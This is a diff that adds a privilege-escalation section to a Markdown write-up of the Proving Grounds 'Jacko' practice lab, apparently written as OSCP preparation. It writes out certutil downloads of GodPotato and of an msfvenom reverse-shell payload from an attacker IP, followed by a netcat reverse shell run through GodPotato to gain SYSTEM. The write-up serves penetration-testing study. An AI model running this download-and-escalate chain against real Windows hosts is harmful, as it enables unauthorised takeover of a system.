@@ -201,3 +201,125 @@ Captured local flag.
 ![](Images/Jacko19.png)
 https://medium.com/@Dpsypher/proving-grounds-practice-jacko-d42c9c1e7f9e
 https://banua.medium.com/proving-grounds-jacko-oscp-prep-2025-practice-12-5e16c080e9cf
+
+
+### Privilege Escalation
+
+![](Images/Jacko20.png)
+The reason `whoami` is **not recognized** in your reverse shell is because the shell you obtained is a **very limited cmd environment**. In some reverse shells (especially when spawned through Java, H2 database, or certain services), the **PATH environment variable is not loaded**, so Windows cannot locate standard binaries like `whoami.exe`.
+
+However, the binary **still exists** on the system. You just need to run it using the **full path**.
+
+### Try this
+
+C:\Windows\System32\whoami.exe
+
+Example:
+
+`C:\Users\tony\Desktop>C:\Windows\System32\whoami.exe`
+
+### Why this happens
+
+Normally Windows uses the **PATH variable** to locate commands.
+
+Typical PATH includes:
+
+```
+C:\Windows\System32  
+C:\Windows  
+C:\Windows\System32\Wbem
+```
+
+This should print the current user running the shell.
+
+```cmd
+C:\Windows\System32\whoami.exe
+```
+
+
+![](Images/Jacko21.png)
+
+We discover the target machine is using an x64 bit architecture when we type “systeminfo.exe”.
+![](Images/Jacko22.png)
+
+We checked for .NEt Framework version. Since our path is broken, we used below command.
+```cmd
+C:\Windows\System32\reg.exe query "HKLM\SOFTWARE\Microsoft\NET Framework Setup\NDP\v4\Full"
+```
+OR 
+We can 1st traverse to that path then execute
+
+```cmd
+reg query "HKLM\SOFTWARE\Microsoft\NET Framework Setup\NDP\v4\Full
+```
+
+![](Images/Jacko23.png)
+
+**x64 and .NET Framework 4** 
+
+Well that’s a relief. If this shell is wonky, we might be able to just use GodPotato for escalation and be done. Let’s try.
+
+https://github.com/BeichenDream/GodPotato/releases
+
+Since, our path is not set we can either set path 1st and then download or we can download using following command.
+
+```cmd
+C:\Windows\System32\certutil.exe -urlcache -split -f http://192.168.45.235:8000/GodPotato-NET4.exe GodPotato-NET4.exe
+```
+
+OR 
+Set the path.
+
+```cmd
+set PATH=C:\Windows\System32;C:\Windows
+```
+
+We need to test it first with “whoami”.
+
+```cmd
+GodPotato-NET4.exe -cmd "C:\Windows\System32\whoami.exe"
+```
+
+![](Images/Jacko24.png)
+
+**After setting the path.**
+![](Images/Jacko25.png)
+
+Now, we are all set.
+Finally let’s go for another reverse shell. Let’s just repeat our previous process.
+
+Create a new msfvenom payload that targets another port (5555).
+```sh
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.235 LPORT=5555 -f exe > rev1.exe
+```
+
+Transfer it to the user’s home directory.
+
+```sh
+certutil -urlcache -split -f http://192.168.45.235:8000/rev1.exe rev1.exe
+```
+
+![](Images/Jacko26.png)
+
+Set up another listener.
+
+Execute the new payload with GodPotato.
+
+![](Images/Jacko27.png)
+
+No matter what I do the shell dies…
+
+This was super frustrating. So we uploaded nc to tha target and tried to gain shell.
+
+![](Images/Jacko28.png)
+
+Then executed below command to gain shell.
+
+```sh
+GodPotato-NET4.exe -cmd "nc.exe -e cmd 192.168.45.235 5555"
+```
+
+![](Images/Jacko30.png)
+
+Upon checking the listener, I successfully received a reverse shell with **SYSTEM-level access**. Although the `whoami` command didn’t display the username properly, I verified that the session had **NT AUTHORITY\SYSTEM** privileges — confirming full privilege escalation.
+![](Images/Jacko29.png)
